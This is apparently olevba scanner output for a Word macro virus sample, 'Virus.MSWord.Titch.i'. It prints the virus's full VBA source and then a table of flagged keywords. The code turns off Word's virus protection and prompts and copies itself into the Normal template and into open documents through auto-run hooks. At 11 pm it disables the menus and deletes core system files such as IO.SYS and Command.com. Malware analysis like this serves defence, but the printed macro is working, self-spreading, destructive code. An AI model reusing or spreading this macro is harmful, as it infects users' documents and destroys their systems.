olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titch.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titch.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Colgate.bas 
in file: ./Virus.MSWord.Titch.i - OLE stream: 'Macros/VBA/Colgate'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Colgate.... badnews for a bad world
'Using your computer L8@nite is bad for you
Sub makeit()
On Error Resume Next
Application.Options.VirusProtection = False
Application.Options.SaveNormalPrompt = False
Application.Options.ConfirmConversions = False
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Dim mod_count As Integer
Dim gotit As Boolean
gotit = False
mod_count = 1

For mod_count = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents.Item(mod_count).CodeModule.Lines(2, 1) = "'colgate" Then gotit = True
Next mod_count

If Not gotit Then
  Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "colgate", wdOrganizerObjectProjectItems
End If

If NormalTemplate.Saved = False Then NormalTemplate.Save

gotit = False
mod_count = 1
For mod_count = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents.Item(mod_count).CodeModule.Lines(1, 1) = "'Colgate.... badnews for a bad world" Then gotit = True
Next mod_count

If Not gotit Then
  NormalTemplate.VBProject.VBComponents("colgate").Export ("c:\colgate.tmp")
  ActiveDocument.VBProject.VBComponents.Import ("c:\colgate.tmp")
  ActiveDocument.SaveAs ActiveDocument.FullName
  Kill ("c:\colgate.tmp")
End If
If DatePart("h", Time) = 23 Then
  doit
End If
End Sub

Sub doit()
On Error Resume Next
Dim dosit As Boolean
Application.CommandBars("File").Enabled = False
Application.CommandBars("Edit").Enabled = False
Application.CommandBars("View").Enabled = False
Application.CommandBars("Insert").Enabled = False
Application.CommandBars("Format").Enabled = False
Application.CommandBars("Tools").Enabled = False
Application.CommandBars("Table").Enabled = False
Application.CommandBars("Window").Enabled = False
Application.CommandBars("Help").Enabled = False
dosit = Shell("C:\windows\command\attrib.exe -r -h -s C:\*.*")
Kill ("C:\autoexec.bat")
Kill ("C:\IO.SYS")
Kill ("C:\MSDOS.SYS")
Kill ("C:\Command.com")
End Sub
Sub AutoClose()
On Error Resume Next
makeit
End Sub

Sub AutoSave()
On Error Resume Next
makeit
End Sub

Sub AutoOpen()
On Error Resume Next
makeit
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|doit                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |attrib.exe          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

